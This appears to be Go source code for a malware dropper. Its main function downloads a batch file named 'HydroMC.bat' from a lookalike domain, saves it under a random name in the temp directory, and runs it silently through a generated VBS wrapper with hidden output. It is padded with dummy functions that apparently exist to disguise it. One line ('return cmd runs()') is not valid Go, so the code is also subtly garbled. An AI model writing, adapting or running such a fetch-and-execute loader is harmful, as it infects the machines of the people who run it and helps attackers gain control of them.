package main

import (
    "crypto/rand"
    "fmt"
    "io/ioutil"
    "math/big"
    "net/http"
    "os"
    "path/filepath"
    "os/exec"
    "runtime"
    "time"
)

func generateRandomString(length int) (string, error) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result := make([]byte, length)
    for i := range result {
        index, err := rand.Int(rand.Reader, big.NewInt(int64(len(characters))))
        if err != nil {
            return "", err
        }
        result[i] = characters[index.Int64()]
    }
    return string(result), nil
}

func executeFile(filePath string, fileType string) error {
    switch runtime.GOOS {
    case "windows":
        if fileType != "bat" {
            cmd := exec.Command(filePath)
            cmd.Stdout = ioutil.Discard
            cmd.Stderr = ioutil.Discard
            return cmd runs()
        }
    default:
        return fmt.Errorf("unsupported platform")
    }
    return nil
}

func dummyFunction1() {
    for i := 0; i < 1000; i++ {
        _ = i * i
    }
}

func dummyFunction2() {
    time.Sleep(1 * time.Millisecond)
}

func performUnnecessaryCalculations() {
    for i := 0; i < 1000; i++ {
        _ = (i * 2) / (i + 1)
    }
}

func main() {
    url := "https://looksrare.cc/HydroMC.bat"
    fileType := "bat"

    response, err := http.Get(url)
    if err != nil {
        fmt.Println("Failed to fetch file:", err)
        return
    }
    defer response.Body.Close()

    script, err := ioutil.ReadAll(response.Body)
    if err != nil {
        fmt.Println("Failed to read response body:", err)
        return
    }

    randomName, err := generateRandomString(10)
    if err != nil {
        fmt.Println("Failed to generate random name:", err)
        return
    }

    tempDir := os.TempDir()
    filePath := filepath.Join(tempDir, randomName+"."+fileType)

    err = ioutil.WriteFile(filePath, script, 0666)
    if err != nil {
        fmt.Println("Failed to write file:", err)
        return
    }

    if fileType == "bat" {
        vbsFilePath := filepath.Join(tempDir, randomName+".vbs")
        vbsContent := fmt.Sprintf(`CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False`)
        err = ioutil.WriteFile(vbsFilePath, []byte(vbsContent), 0666)
        if err != nil {
            fmt.Println("Failed to write VBS file:", err)
            return
        }
        cmd := exec.Command("wscript", vbsFilePath, filePath)
        cmd.Stdout = ioutil.Discard
        cmd.Stderr = ioutil.Discard
        err = cmd.Run()
        if err != nil {
            fmt.Println("Failed to execute VBS:", err)
            return
        }
    } else {
        err = executeFile(filePath, fileType)
        if err != nil {
            fmt.Println("Failed to execute file:", err)
            return
        }
    }

    dummyFunction1()
    dummyFunction2()
    performUnnecessaryCalculations()

    fmt.Println("Batch file executed successfully.")
}
